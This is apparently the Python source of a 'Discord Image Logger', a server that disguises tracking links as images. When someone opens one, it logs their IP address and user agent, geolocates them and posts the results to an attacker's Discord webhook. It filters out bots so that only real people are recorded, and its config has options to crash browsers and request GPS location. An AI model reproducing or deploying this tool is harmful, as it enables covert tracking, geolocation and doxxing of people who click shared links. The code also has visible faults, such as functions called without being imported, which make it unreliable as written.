from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
    "image": "https://yoursite.com/imagelogger?url=(url-escaped link to an image here)", # You can have a custom image by using a URL argument
    "custom_image": True, # Allows you to use a URL argument to change the image (SEE README)
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": "0xFF0000", # Hex Color you want for the embed (Example: Red is 0xFF0000)
    "options": {
        "crash": False, # Tries to crash/freeze the user's browser, may not work (SEE https://github.com/Dekrypt/Chromebook-Crasher)
        "location": False, # Uses GPS to find users exact location (Real Address, etc.) because it asks the user which may be suspicious
        "message": "", # Show a custom message when user opens the image
        "dismiss": False, # Enable when user opens the image
        "explanation": True, # Embed pwned text (Dekrypt's Image Logger)
    },
    "redirect": False, # Redirect to a web
    "image_redirect": "http://your-url-here.com/in-the-message-to-break", # If redirect
    "buggedImage": False, # Bugged image (disables image and crashes browser)
    "antispam": "", # Antispam (No antispam)
    "linkAlerts": True, # Link alerts
}

blacklistedIPs = ("34.", "35.") # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [ {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        } ],
    })

def makeReport(ip, useragent = None, coords = None, endpoint = "/", url = False):
    if ip.startswith(blacklistedIPs): # Blacklisted IP
        return
    bot = botCheck(ip, useragent)
    if bot:
        return
    if config["linkAlerts"]:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [ {
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"An *Image Logging* link was sent in a chat! You may receive an IP soon. URL: **{endpoint}** IP: **{ip}**",
            } ]
        })
    geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,asn,lat,lon,mobile,proxy,hosting,timezone")
    geo = geo.json()
    if geo["status"] == "success":
        country = geo["country"] if geo["country"] else "Unknown"
        region = geo["regionName"] if geo["regionName"] else "Unknown"
        city = geo["city"] if geo["city"] else "Unknown"
        coords = f"{geo['lat']}, {geo['lon']}" if coords else f"[Google Maps](https://www.google.com/maps/search/google+maps+{geo['lat']},{geo['lon']} (Approximate if no coords))"
        timezone = geo["timezone"].split("/")[0] if geo["timezone"] else "Unknown"
        mobile = geo["mobile"]
        vpn = geo["proxy"] if geo["proxy"] and not geo["hosting"] else "Possibly" if geo["hosting"] else "False"
        hosting = geo["hosting"] if geo["hosting"] and not geo["proxy"] else "Possibly" if geo["proxy"] else "False"
        os_ = geo["org"] if geo["org"] else "Unknown"
        browser = httpagentparser.detect(useragent)
    else:
        country = region = city = coords = timezone = mobile = vpn = hosting = os_ = browser = "Unknown"
    embed = {
        "title": "Image Logger - IP Logged",
        "color": int(config["color"], 16),
        "description": f"**A User opened the Original Image**\n**Endpoint:** {endpoint}",
        "fields": [
            {"name": "IP", "value": ip, "inline": True},
            {"name": "Provider", "value": geo["isp"] if geo["isp"] else "Unknown", "inline": True},
            {"name": "ASN", "value": geo["asn"] if geo["asn"] else "Unknown", "inline": True},
            {"name": "Country", "value": country, "inline": True},
            {"name": "Region", "value": region, "inline": True},
            {"name": "City", "value": city, "inline": True},
            {"name": "Coords", "value": coords, "inline": True},
            {"name": "Timezone", "value": timezone, "inline": True},
            {"name": "Mobile", "value": mobile, "inline": True},
            {"name": "VPN", "value": vpn, "inline": True},
            {"name": "Hosting", "value": hosting, "inline": True},
            {"name": "OS", "value": os_, "inline": True},
            {"name": "Browser", "value": browser, "inline": True},
            {"name": "User Agent", "value": (useragent[:100] + "...") if len(useragent) > 100 else useragent, "inline": False},
        ]
    }
    if config["options"]["explanation"]:
        embed["description"] += "\n**Explanation:** You've been pwned by Dekrypt's Image Logger!"
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone" if config["antispam"] else "",
        "embeds": [embed]
    })

class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            useragent = self.headers.get('user-agent', 'Unknown')
            endpoint = parsed.path
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else params.get('url', [config["image"]])[0])
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                return
            makeReport(ip, useragent, endpoint=endpoint)
            url = params.get('url', [config["image"]])[0]
            if config["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["image_redirect"])
            else:
                self.send_response(302)
                self.send_header('Location', url)
            self.end_headers()
        except Exception as e:
            reportError(str(e))
            self.send_response(500)
            self.end_headers()

binaries = {
    "loading": base64.b64decode(b'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==')
}

if __name__ == "__main__":
    from http.server import HTTPServer
    HTTPServer(("0.0.0.0", 80), ImageLoggerHandler).serve_forever()
